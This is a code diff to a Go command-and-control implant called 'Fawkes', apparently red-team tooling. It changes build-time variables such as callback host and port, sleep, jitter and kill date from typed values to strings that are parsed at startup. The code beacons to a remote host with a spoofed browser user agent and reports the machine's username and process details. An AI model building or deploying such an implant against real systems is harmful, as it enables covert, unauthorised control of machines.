@@ -12,6 +12,8 @@ import (
 
 	"github.com/google/uuid"
 
+	"strconv"
+
 	"fawkes/pkg/commands"
 	"fawkes/pkg/http"
 	"fawkes/pkg/profiles"
@@ -23,19 +25,27 @@ var (
 	payloadUUID        string = ""
 	c2Profile          string = ""
 	callbackHost       string = ""
-	callbackPort       int    = 443
+	callbackPort       string = "443"
 	userAgent         string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-	sleepInterval     int    = 10
-	jitter            int    = 10
+	sleepInterval     string = "10"
+	jitter            string = "10"
 	encryptionKey     string = ""
-	killDate          int64  = 0
-	maxRetries        int    = 10
-	debug             bool   = false
+	killDate          string = "0"
+	maxRetries        string = "10"
+	debug             string = "false"
 )
 
 func main() {
+	// Convert string build variables to appropriate types
+	callbackPortInt, _ := strconv.Atoi(callbackPort)
+	sleepIntervalInt, _ := strconv.Atoi(sleepInterval)
+	jitterInt, _ := strconv.Atoi(jitter)
+	killDateInt64, _ := strconv.ParseInt(killDate, 10, 64)
+	maxRetriesInt, _ := strconv.Atoi(maxRetries)
+	debugBool, _ := strconv.ParseBool(debug)
+
 	// Setup logging
-	if debug {
+	if debugBool {
 		log.SetOutput(os.Stdout)
 		log.Println("[DEBUG] Starting Fawkes agent")
 	}
@@ -47,7 +57,7 @@ func main() {
 	}
 
 	// Check kill date
-	if killDate > 0 && time.Now().Unix() > killDate {
+	if killDateInt64 > 0 && time.Now().Unix() > killDateInt64 {
 		log.Printf("[INFO] Agent past kill date, exiting")
 		os.Exit(0)
 	}
@@ -64,21 +74,21 @@ func main() {
 		OS:              getOperatingSystem(),
 		PID:             os.Getpid(),
 		ProcessName:     os.Args[0],
-		SleepInterval:   sleepInterval,
-		Jitter:         jitter,
+		SleepInterval:   sleepIntervalInt,
+		Jitter:         jitterInt,
 		User:           getUsername(),
 		Description:    fmt.Sprintf("Fawkes agent %s", payloadUUID[:8]),
 	}
 
 	// Initialize HTTP profile
 	httpProfile := http.NewHTTPProfile(
-		fmt.Sprintf("http://%s:%d", callbackHost, callbackPort),
+		fmt.Sprintf("http://%s:%d", callbackHost, callbackPortInt),
 		userAgent,
 		encryptionKey,
-		maxRetries,
-		sleepInterval,
-		jitter,
-		debug,
+		maxRetriesInt,
+		sleepIntervalInt,
+		jitterInt,
+		debugBool,
 	)
 
 	// Initialize C2 profile
